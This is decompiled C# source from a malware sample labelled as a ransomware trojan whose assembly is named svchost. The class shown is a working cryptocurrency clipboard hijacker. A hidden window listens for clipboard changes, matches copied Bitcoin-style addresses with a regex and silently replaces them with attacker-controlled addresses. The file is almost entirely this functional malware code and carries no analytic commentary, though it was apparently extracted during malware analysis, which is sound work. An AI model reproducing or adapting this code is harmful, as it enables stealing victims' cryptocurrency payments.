// Decompiled with JetBrains decompiler
// Type: ConsoleApplication7.driveNotification
// Assembly: svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 780B9B63-AAF3-4FA2-8AAF-646F68F557AE
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-b01ecdd43fb77aab5ab419ef538380270295e4e61bc28de952964c1c92205fed.exe

using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7
{
  public sealed class driveNotification
  {
    public class NotificationForm : Form
    {
      private static string currentClipboard = driveNotification.NotificationForm.GetText();

      public NotificationForm()
      {
        Program.NativeMethods.SetParent(this.Handle, Program.NativeMethods.intpreclp);
        Program.NativeMethods.AddClipboardFormatListener(this.Handle);
      }

      private bool RegexResult(Regex pattern) => pattern.Match(driveNotification.NotificationForm.currentClipboard).Success;

      protected override void WndProc(ref Message m)
      {
        if (m.Msg == 797)
        {
          driveNotification.NotificationForm.currentClipboard = driveNotification.NotificationForm.GetText();
          if (driveNotification.NotificationForm.currentClipboard.StartsWith("bc1"))
          {
            if (this.RegexResult(Program.appMutexRegex) && !driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex))
              driveNotification.NotificationForm.SetText(Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex));
          }
          else if (this.RegexResult(Program.appMutexRegex) && !driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex2))
            driveNotification.NotificationForm.SetText(Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex2));
        }
        base.WndProc(ref m);
      }

      protected override CreateParams CreateParams
      {
        get
        {
          CreateParams createParams = base.CreateParams;
          createParams.ExStyle |= 128;
          return createParams;
        }
      }

      public static string GetText()
      {
        string ReturnValue = string.Empty;
        Thread thread = new Thread((ThreadStart) (() => ReturnValue = Clipboard.GetText()));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
        return ReturnValue;
      }

      public static void SetText(string txt)
      {
        Thread thread = new Thread((ThreadStart) (() => Clipboard.SetText(txt)));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
      }
    }
  }
}
